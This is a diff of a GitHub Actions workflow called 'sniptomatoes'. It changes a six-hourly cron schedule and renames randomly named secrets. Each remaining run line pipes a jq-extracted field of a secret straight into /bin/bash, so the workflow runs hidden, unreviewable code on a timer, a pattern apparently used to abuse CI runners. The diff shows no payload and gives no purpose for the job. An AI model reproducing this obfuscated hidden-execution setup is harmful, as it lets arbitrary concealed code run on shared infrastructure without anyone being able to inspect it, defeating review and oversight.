@@ -2,37 +2,16 @@ name: sniptomatoes
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 5/6 * * *'
-
-jobs:  # 21189
+    - cron: '2 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: sniptomatoes
         env:
-          gbn1: ${{ secrets.gbn1 }}
+          cqbtl432: ${{ secrets.cqbtl432 }}
         run: |
-          echo $gbn1 | jq -r .pw96 | /bin/bash
-          echo $sdsi6982 | jq -r .qdnny509 | /bin/bash
-          echo $hmu0 | jq -r .ohh17 | /bin/bash
-          echo $wh0096 | jq -r .ox86 | /bin/bash
-          echo $okmm87661 | jq -r .tq25 | /bin/bash
-          echo $wtqjn8957 | jq -r .v9 | /bin/bash
-          echo $opkkl906 | jq -r .mw91 | /bin/bash
-          echo $s0 | jq -r .ozf46994 | /bin/bash
-          echo $kut050 | jq -r .sxkac8488 | /bin/bash
-          echo $jg282 | jq -r .n34 | /bin/bash
-          echo $rcj0 | jq -r .sbk55 | /bin/bash
-          echo $bewzw2499 | jq -r .hmwom1 | /bin/bash
-          echo $sgnf286 | jq -r .tbk334 | /bin/bash
-          echo $gjs8 | jq -r .dv1129 | /bin/bash
-          echo $ucq3609 | jq -r .rph87101 | /bin/bash
-          echo $l0758 | jq -r .qa128 | /bin/bash
-          echo $zbqfe28 | jq -r .fx2 | /bin/bash
-          echo $uzo46365 | jq -r .wj70 | /bin/bash
-          echo $x0 | jq -r .fn5 | /bin/bash
-          echo $ly323 | jq -r .ycd993 | /bin/bash
-          echo $q7054 | jq -r .znmfg70 | /bin/bash
-          echo $mizx17 | jq -r .tcju1 | /bin/bash
+          echo $cqbtl432 | jq -r .ctnx3 | /bin/bash
+          echo $hxg72426 | jq -r .lpyql93921 | /bin/bash
 
